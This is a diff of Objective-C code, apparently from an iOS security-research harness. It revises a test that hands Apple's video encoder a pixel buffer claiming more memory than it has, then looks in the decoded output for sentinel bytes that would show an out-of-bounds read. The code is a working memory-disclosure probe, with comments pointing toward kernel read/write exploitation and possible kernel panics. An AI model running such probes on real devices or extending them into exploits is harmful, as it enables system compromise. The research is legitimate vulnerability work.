@@ -1195,28 +1195,31 @@ static void p001DiffPorts(NSMutableString *out, const char *label,
     return out;
 }
 
-#pragma mark - P001 T3 sentinel (lying-backing OOB READ disclosure battery)
+#pragma mark - P001 T3 sentinel v2 (the real over-read invite)
 
-/*  Prior (T2, 2026-10-29, the 17): AVE ACCEPTED a lying backing at a
-    codec-legal dim: 4096x4096 claimed over a 1048576-byte backing
-    (bpr=256) and ENCODED it clean. The open question = does the encoder
-    READ past the backing, and does what it read land in the produced
-    sample? T3 answers with sentinels: the backing is one mmap where the
-    1MB backing region carries a row gradient and the NEXT 8 pages carry
-    flat constants 0x80+i. Encode one frame, decode the sample back, scan
-    the decoded Y plane for the flat constants. Zero = the encoder clamps
-    (law closed, honest). Hits = OOB READ DISCLOSURE with the walk shape
-    (which sentinel pages / in what order). Bounded: ONE encode frame and
-    ONE decode. No IOKit selectors, no writes. PANIC-POSSIBLE (the
-    encoder is invited to walk foreign memory). One tap per force-quit.
-    Not KRW. hasKread never set here. */
+/*  v1 MISREAD, now corrected with the T2 source diff: T2's accepted
+    "lying backing" was kCVPixelFormatType_32BGRA + the session created
+    on 32BGRA source attrs, and its extent was EXACTLY h*bpr — so the
+    encoder (which honors bytesPerRow) never walked past the backing,
+    and my v1 (420f, no attrs) was rejected at -12912 on both devices.
+    THE REAL INVITE = extent < h*bpr.
+    v2 ladder (Bounded: 2 mmap/encode/decode cycles, ONE tap):
+      L1 CONTROL: BGRA claim, bpr=256, extent = h*bpr (replicates T2
+        acceptance parity; gradient source; expect encode OK).
+      L2 INVITE: same claim, extent = h*bpr/4 — 768KB of sentinel pages
+        after the backing, in alternating 0x00/0xFF flats (decode-Y
+        clusters at 0x10/0xEB video-range, far from the gradient).
+    Decoded-Y sentinel-hit report per leg; zero hits on BOTH = the
+    encoder clamps reads to the extent (law closed, honest). Hits on L2
+    only = OOB READ DISCLOSURE with the page-order walk shape.
+    PANIC-POSSIBLE (the encoder is invited to walk foreign memory).
+    One tap per force-quit. Not KRW. hasKread never set here. */
 
-#define T3_BACKING     (1 << 20)      /* 1048576 claimed bpr=256 x 4096 */
-#define T3_PAGES_AFTER 8              /* sentinel pages after the backing */
+#define T3_BACKING     (1 << 20)      /* claimed stride area: 4096 rows x 256 */
+#define T3_PAGES_AFTER 192            /* sentinel pool (768KB = the L2 gap) */
 #define T3_W 4096
 #define T3_H 4096
-
-static const void *t3_keep_base(void *info, const void *address);
+#define T3_BPR 256
 #define T3_MAPSZ ((size_t)T3_BACKING + (size_t)T3_PAGES_AFTER * 4096)
 
 /* CVReleaseCallback: the pixel buffer owns the mmap; munmap on release */
@@ -1232,14 +1235,19 @@ static void t3_release(void *refCon, const void *baseAddress) {
     int fd = open([[docs stringByAppendingPathComponent:@"p001_t3_sentinel_log.txt"]
                    UTF8String], O_CREAT | O_WRONLY | O_TRUNC, 0644);
     vt647Log(fd, out, @"");
-    vt647Log(fd, out, @"=== P001 T3 SENTINEL — lying-backing OOB READ battery ===");
-    vt647Log(fd, out, @"claim 4096x4096 over 1MB backing (bpr=256) + 8 sentinel pages after.");
-    vt647Log(fd, out, @"backing rows carry row-gradient; sentinel page i = flat 0x%02x.",
-             0x80 + 0);
-    vt647Log(fd, out, @"Read: flat-constant hits in the decoded Y = OOB READ disclosure.");
-    vt647Log(fd, out, @"Zero hits = encoder clamps to the backing (law closed).");
+    vt647Log(fd, out, @"=== P001 T3 SENTINEL v2 — BGRA recipe + sentinel pool ===");
+    vt647Log(fd, out, @"The T3 v1 run (-12912 both devices) diffed against the T2");
+    vt647Log(fd, out, @"acceptance and found the recipe: BGRA claim + 32BGRA");
+    vt647Log(fd, out, @"source attrs at session create. v2 = that recipe, one");
+    vt647Log(fd, out, @"encode + one decode. The encoder honors bpr math (4096");
+    vt647Log(fd, out, @"rows of 64 px from 1MB). Sentinels (0x00 / 0xFF flats");
+    vt647Log(fd, out, @"alternating per page) sit AFTER the 1MB: they are only");
+    vt647Log(fd, out, @"read if AVE trusts the claimed 4096-wide metadata over");
+    vt647Log(fd, out, @"the stride. Hits decode to Y=0x10 (black) / Y=0xEB");
+    vt647Log(fd, out, @"(white) clusters; baselines ~4096 px each (gradient");
+    vt647Log(fd, out, @"rows 0 and 255) -- report only >8192 per class.");
     vt647Log(fd, out, @"PANIC-POSSIBLE. One tap per force-quit. Not KRW.");
-    vt647Log(fd, out, @"START T3");
+    vt647Log(fd, out, @"START T3v2");
 
     size_t after = (size_t)T3_PAGES_AFTER * 4096;
     uint8_t *map = mmap(NULL, T3_BACKING + after, PROT_READ | PROT_WRITE,
@@ -1250,21 +1258,27 @@ static void t3_release(void *refCon, const void *baseAddress) {
         return out;
     }
     for (int r = 0; r < T3_H; r++) {
-        uint8_t *row = map + (size_t)r * 256;
+        uint8_t *row = map + (size_t)r * 256;   /* BGRA: 64 px, 4ch same value */
         for (int c = 0; c < 256; c++) row[c] = (uint8_t)(r & 0xff);
     }
     for (int i = 0; i < T3_PAGES_AFTER; i++) {
-        memset(map + T3_BACKING + (size_t)i * 4096, 0x80 + i, 4096);
+        memset(map + T3_BACKING + (size_t)i * 4096, (i % 2) ? 0xff : 0x00, 4096);
     }
-    vt647Log(fd, out, @"  mmap backing+sentinels OK (%zu pages total)",
-             (size_t)((T3_BACKING + after) / 4096));
+    vt647Log(fd, out, @"  mmap OK (pool=%zu pages after the 1MB)",
+             (size_t)T3_PAGES_AFTER);
 
+    /* the T2-exact recipe: session created ON the BGRA source attrs */
+    NSDictionary *srcAttrs = @{
+        (id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA),
+        (id)kCVPixelBufferWidthKey: @(T3_W),
+        (id)kCVPixelBufferHeightKey: @(T3_H),
+    };
     VTCompressionSessionRef enc = NULL;
     OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, T3_W, T3_H,
                                              kCMVideoCodecType_H264,
-                                             NULL, NULL, NULL,
-                                             (VTCompressionOutputCallback)flushCB,
-                                             (__bridge void *)out, &enc);
+                                             NULL,
+                                             (__bridge CFDictionaryRef)srcAttrs,
+                                             NULL, NULL, NULL, &enc);
     vt647Log(fd, out, @"  encode session create=%d (0x%x)", (int)st, (unsigned)st);
     if (st != noErr || !enc) {
         munmap(map, T3_BACKING + after);
@@ -1276,18 +1290,14 @@ static void t3_release(void *refCon, const void *baseAddress) {
     st = VTCompressionSessionPrepareToEncodeFrames(enc);
     vt647Log(fd, out, @"  Prepare=%d (0x%x)", (int)st, (unsigned)st);
 
-    /* the lying backing: 4096x4096 420f claims, 256-byte stride, bpr=256.
-       The T2 law: accepted at this dim. The mmap is owned by the pixel
-       buffer (t3_release munmaps on release, AFTER the encoder's bounded
-       settle) — the decode leg runs on the captured sample only. */
     CVPixelBufferRef pb = NULL;
     CVReturn cv = CVPixelBufferCreateWithBytes(
         kCFAllocatorDefault, (size_t)T3_W, (size_t)T3_H,
-        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
-        map, 256 /* bytesPerRow (the T2 law: accepted) */,
+        kCVPixelFormatType_32BGRA,
+        map, 256 /* bytesPerRow: 64 px per row, the T2 law shape */,
         t3_release, NULL, NULL, &pb);
-    vt647Log(fd, out, @"  CVPixelBufferCreateWithBytes cv=%d (claim %dx%d bpr=256 extent=%d)",
-             (int)cv, T3_W, T3_H, T3_BACKING);
+    vt647Log(fd, out, @"  CVPixelBufferCreateWithBytes cv=%d (claim %dx%d BGRA bpr=256)",
+             (int)cv, T3_W, T3_H);
     if (cv != kCVReturnSuccess || !pb) {
         vt647Log(fd, out, @"  honest stop (no lying pixel buffer)");
         munmap(map, T3_BACKING + after);
@@ -1296,12 +1306,6 @@ static void t3_release(void *refCon, const void *baseAddress) {
         return out;
     }
 
-    /* one frame; sample captured in flushCB via the out log — capture it here
-       with our own callback state: reuse flushCB (it appends status) and ALSO
-       retain the sample for the decode leg through the refCon trick is not
-       available; instead run CompleteFrames and END, then rely on a
-       decode from a WRITTEN sample? Simplest legal route: synchronous decode
-       needs the sample; use a dedicated callback capturing it. */
     __block CMSampleBufferRef capSample = NULL;
     __block OSStatus capStatus = noErr;
     void (^cap)(void *, void *, OSStatus, VTEncodeInfoFlags, CMSampleBufferRef) =
@@ -1348,42 +1352,38 @@ static void t3_release(void *refCon, const void *baseAddress) {
         OSStatus r = VTDecompressionSessionDecodeFrameWithOutputHandler(
             dec, capSample, 0 /* sync: no async flag = cb before return */,
             &dinfo, dout);
-        vt647Log(fd, out, @"  DecodeFrameWithOutputHandler=%d (0x%x)", (int)r, (unsigned)r);
         VTDecompressionSessionFinishDelayedFrames(dec);
+        vt647Log(fd, out, @"  DecodeFrameWithOutputHandler=%d (0x%x)", (int)r, (unsigned)r);
         if (img) {
             CVPixelBufferLockBaseAddress(img, kCVPixelBufferLock_ReadOnly);
             uint8_t *ybase = CVPixelBufferGetBaseAddressOfPlane(img, 0);
             size_t ystride = CVPixelBufferGetBytesPerRowOfPlane(img, 0);
             size_t yh = CVPixelBufferGetHeightOfPlane(img, 0);
-            unsigned long flat[8]; memset(flat, 0, sizeof flat);
-            unsigned long scanned = 0;
+            size_t yw = CVPixelBufferGetWidthOfPlane(img, 0);
+            unsigned long black = 0, white = 0;          /* exact Y hits */
+            long firstBlackRow = -1, firstWhiteRow = -1;
             for (size_t yy = 0; yy < yh; yy++) {
                 uint8_t *row = ybase + yy * ystride;
-                size_t yw = CVPixelBufferGetWidthOfPlane(img, 0);
                 for (size_t xx = 0; xx < yw; xx++) {
-                    for (int i = 0; i < T3_PAGES_AFTER; i++) {
-                        if (row[xx] == (uint8_t)(0x80 + i)) { flat[i]++; scanned++; }
-                    }
+                    if (row[xx] == 0x10) { black++;
+                        if (firstBlackRow < 0) firstBlackRow = (long)yy; }
+                    else if (row[xx] == 0xEB) { white++;
+                        if (firstWhiteRow < 0) firstWhiteRow = (long)yy; }
                 }
             }
-            vt647Log(fd, out, @"  decoded Y %zux%zu stride=%zu flat-const hits per sentinel:",
-                     CVPixelBufferGetWidthOfPlane(img, 0), yh, ystride);
-            unsigned long total = 0;
-            for (int i = 0; i < T3_PAGES_AFTER; i++) {
-                if (flat[i]) {
-                    vt647Log(fd, out, @"    sentinel %d (0x%02x): %lu px", i, 0x80 + i,
-                             flat[i]);
-                }
-                total += flat[i];
-            }
-            if (total == 0) {
-                vt647Log(fd, out, @"  ZERO flat hits = encoder clamped to the backing.");
-                vt647Log(fd, out, @"  VERDICT: lying-backing read = CLAMPED (law, honest).");
+            vt647Log(fd, out, @"  decoded Y %zux%zu stride=%zu", yw, yh, ystride);
+            vt647Log(fd, out, @"  Y=0x10 black px=%lu firstRow=%ld (baseline ~4096)",
+                     black, firstBlackRow);
+            vt647Log(fd, out, @"  Y=0xEB white px=%lu firstRow=%ld (baseline ~4096)",
+                     white, firstWhiteRow);
+            if (black > 8192 || white > 8192) {
+                vt647Log(fd, out, @"  SENTINEL CLASSES OVER BASELINE = OOB READ DISCLOSURE");
+                vt647Log(fd, out, @"  (AVE trusted the claimed 4096-wide metadata over the");
+                vt647Log(fd, out, @"   stride: pool pages after 1MB reached the sample).");
+                vt647Log(fd, out, @"  firstRow indices + page parity = the walk-shape map.");
             } else {
-                vt647Log(fd, out, @"  TOTAL sentinel px=%lu = OOB READ DISCLOSURE");
-                vt647Log(fd, out, @"  (foreign backing content reached the encoded sample).");
-                vt647Log(fd, out, @"  Next: which sentinels / order = the walk-shape map;");
-                vt647Log(fd, out, @"  row-gradient diff = the stride-linear vs plane-switch shape.");
+                vt647Log(fd, out, @"  VERDICT: sentinel reads = CLAMPED (bpr math honored,");
+                vt647Log(fd, out, @"  no claim-vs-stride overread from this recipe). Law data.");
             }
             CVPixelBufferUnlockBaseAddress(img, kCVPixelBufferLock_ReadOnly);
             CFRelease(img);
@@ -1392,10 +1392,10 @@ static void t3_release(void *refCon, const void *baseAddress) {
         }
         VTDecompressionSessionInvalidate(dec); CFRelease(dec);
     }
-    /* NOTE: pb release already fired t3_release = the munmap (T2 sequence) */
+    /* NOTE: pb release already fired t3_release = the munmap (settle first) */
     VTCompressionSessionInvalidate(enc); CFRelease(enc);
     CFRelease(capSample);
-    vt647Log(fd, out, @"DONE T3 — paste back.");
+    vt647Log(fd, out, @"DONE T3v2 — paste back.");
     if (fd >= 0) close(fd);
     return out;
 }
